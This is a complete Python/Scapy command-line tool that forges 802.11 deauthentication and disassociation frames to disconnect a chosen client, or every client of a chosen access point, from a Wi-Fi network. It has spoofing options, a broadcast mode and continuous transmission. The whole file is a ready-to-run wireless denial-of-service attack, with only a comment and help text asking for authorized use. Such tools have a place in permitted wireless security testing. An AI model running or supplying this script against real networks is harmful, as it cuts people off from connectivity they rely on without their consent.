#!/usr/bin/env python3
"""
802.11 deauthentication / disassociation frame sender (Scapy).

Use only on networks you own or have explicit written permission to test.
Unauthorized use is illegal in most jurisdictions.
"""

from __future__ import annotations

import argparse
import os
import re
import signal
import sys
from typing import List, Optional, Tuple

from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas
from scapy.sendrecv import sendp
from scapy.utils import hexdump

try:
    from scapy.layers.dot11 import RadioTap
except ImportError:
    from scapy.layers.radiotap import RadioTap  # type: ignore

try:
    from scapy.interfaces import get_if_list
except ImportError:
    from scapy.arch import get_if_list  # type: ignore

_MAC_RE = re.compile(
    r"^([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})[:-]"
    r"([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})[:-]([0-9A-Fa-f]{2})$"
)
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


def normalize_mac(mac: str) -> str:
    """Accept 'aa:bb:cc:dd:ee:ff' or 'aa-bb-cc-dd-ee-ff'; return lower-case colon form."""
    s = mac.strip()
    m = _MAC_RE.match(s)
    if not m:
        raise ValueError(f"Invalid MAC address: {mac!r} (expected aa:bb:cc:dd:ee:ff)")
    return ":".join(x.lower() for x in m.groups())


def require_root() -> None:
    if os.name != "posix":
        return
    if os.geteuid() != 0:
        print(
            "Error: raw 802.11 injection usually requires root (try: sudo).",
            file=sys.stderr,
        )
        sys.exit(1)


def resolve_addresses(
    target: Optional[str],
    gateway: str,
    *,
    broadcast: bool,
    sta_to_ap: bool,
) -> Tuple[str, str, str]:
    """Return Dot11 (addr1, addr2, addr3) for deauth/disassoc."""
    if broadcast:
        if sta_to_ap:
            raise ValueError(
                "--broadcast applies to AP→STA only (spoofed “from AP” to one or all STAs)"
            )
        return BROADCAST_MAC, gateway, gateway
    if not target:
        raise ValueError("client MAC required unless --broadcast")
    if sta_to_ap:
        # Receiver = AP, transmitter = STA (client-initiated leave)
        return gateway, target, gateway
    # Default: spoofed from AP to client
    return target, gateway, gateway


def build_packets(
    addr1: str,
    addr2: str,
    addr3: str,
    *,
    frame: str,
    reason: int,
) -> List:
    """Build RadioTap / Dot11 / Deauth|Disassoc packet(s)."""
    out = []
    if frame in ("deauth", "both"):
        d = Dot11(addr1=addr1, addr2=addr2, addr3=addr3)
        out.append(RadioTap() / d / Dot11Deauth(reason=reason))
    if frame in ("disassoc", "both"):
        d = Dot11(addr1=addr1, addr2=addr2, addr3=addr3)
        out.append(RadioTap() / d / Dot11Disas(reason=reason))
    return out


def transmit(
    packets: List,
    *,
    count: Optional[int],
    iface: str,
    inter: float,
    verbose: int,
) -> None:
    if len(packets) == 1:
        p = packets[0]
        if count is None:
            sendp(p, iface=iface, loop=1, inter=inter, verbose=verbose)
        else:
            sendp(p, iface=iface, count=count, inter=inter, verbose=verbose)
        return
    if count is None:
        sendp(packets, iface=iface, loop=1, inter=inter, verbose=verbose)
    else:
        sendp(packets, iface=iface, count=count, inter=inter, verbose=verbose)


def run_list_ifaces() -> None:
    for name in sorted(get_if_list()):
        print(name)


def run_dry_run(packets: List, *, iface: str) -> None:
    print(f"Interface: {iface}")
    print(f"Packet(s): {len(packets)}")
    for i, p in enumerate(packets, 1):
        print(f"\n--- Packet {i} ---")
        p.show()
        print()
        hexdump(p)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Send 802.11 deauthentication / disassociation frames (monitor-mode NIC).",
        epilog="Authorized security testing only. Misuse may be criminal.",
    )
    parser.add_argument(
        "target",
        nargs="?",
        default=None,
        help="Client MAC (STA). Omit with --broadcast if you pass -b/--bssid.",
    )
    parser.add_argument(
        "gateway",
        nargs="?",
        default=None,
        help="BSSID (AP MAC); optional if you use -b/--bssid instead.",
    )
    parser.add_argument(
        "-b",
        "--bssid",
        metavar="MAC",
        default=None,
        help="BSSID (AP MAC). Use with --broadcast to avoid ambiguous positionals.",
    )
    parser.add_argument(
        "-c",
        "--count",
        type=int,
        default=100,
        metavar="N",
        help="Send cycles (default: 100). With --frame both, each cycle sends 2 frames. "
        "Use 0 for continuous until Ctrl+C.",
    )
    parser.add_argument(
        "-i",
        "--iface",
        default="wlan0mon",
        help="Wireless interface in monitor mode (default: wlan0mon)",
    )
    parser.add_argument(
        "--inter",
        type=float,
        default=0.0,
        metavar="SEC",
        help="Seconds between frames (default: 0). Small delay reduces driver/NIC stress.",
    )
    parser.add_argument(
        "--reason",
        type=int,
        default=7,
        metavar="CODE",
        help="802.11 reason code for deauth/disassoc (default: 7)",
    )
    parser.add_argument(
        "--frame",
        choices=("deauth", "disassoc", "both"),
        default="deauth",
        help="Frame type: deauth, disassoc, or both per cycle (default: deauth)",
    )
    parser.add_argument(
        "--broadcast",
        action="store_true",
        help="addr1 = broadcast: affect all clients associated to this BSSID (AP→STA only)",
    )
    parser.add_argument(
        "--sta-to-ap",
        action="store_true",
        help="Direction STA→AP (receiver = AP). Try when AP→STA alone is ignored; "
        "cannot combine with --broadcast.",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Build and print packet(s); do not transmit (no root required)",
    )
    parser.add_argument(
        "--list-ifaces",
        action="store_true",
        help="Print Scapy-visible interface names and exit",
    )
    parser.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="Less Scapy output",
    )
    args = parser.parse_args()

    if args.list_ifaces:
        try:
            run_list_ifaces()
        except OSError as e:
            print(f"Error: could not list interfaces ({e})", file=sys.stderr)
            sys.exit(3)
        return

    bssid = args.bssid or args.gateway
    sta_mac = args.target
    # Convenience:  WiFi-Deauth.py --broadcast <BSSID>  (one positional)
    if args.broadcast and not bssid and sta_mac:
        bssid = sta_mac
        sta_mac = None

    if not bssid:
        parser.error("BSSID required: second positional, -b/--bssid, or one MAC with --broadcast")

    if not args.broadcast and not sta_mac:
        parser.error("STA MAC required unless --broadcast")

    if args.reason < 0 or args.reason > 65535:
        print("Error: --reason must be 0-65535", file=sys.stderr)
        sys.exit(2)

    count: Optional[int] = None if args.count == 0 else args.count
    if count is not None and count < 1:
        print("Error: --count must be >= 1, or 0 for continuous", file=sys.stderr)
        sys.exit(2)

    try:
        gateway = normalize_mac(bssid)
        target_norm: Optional[str] = normalize_mac(sta_mac) if sta_mac else None
        addr1, addr2, addr3 = resolve_addresses(
            target_norm,
            gateway,
            broadcast=args.broadcast,
            sta_to_ap=args.sta_to_ap,
        )
    except ValueError as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(2)

    packets = build_packets(addr1, addr2, addr3, frame=args.frame, reason=args.reason)

    if args.dry_run:
        run_dry_run(packets, iface=args.iface)
        return

    require_root()

    verbose = 0 if args.quiet else 1

    def _stop(_sig, _frame):
        print("\nStopped.", file=sys.stderr)
        sys.exit(0)

    signal.signal(signal.SIGINT, _stop)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, _stop)

    try:
        transmit(
            packets,
            count=count,
            iface=args.iface,
            inter=args.inter,
            verbose=verbose,
        )
    except OSError as e:
        print(f"Error: send failed ({e}). Check interface name and monitor mode.", file=sys.stderr)
        sys.exit(3)
    except KeyboardInterrupt:
        print("\nStopped.", file=sys.stderr)
        sys.exit(0)


if __name__ == "__main__":
    main()
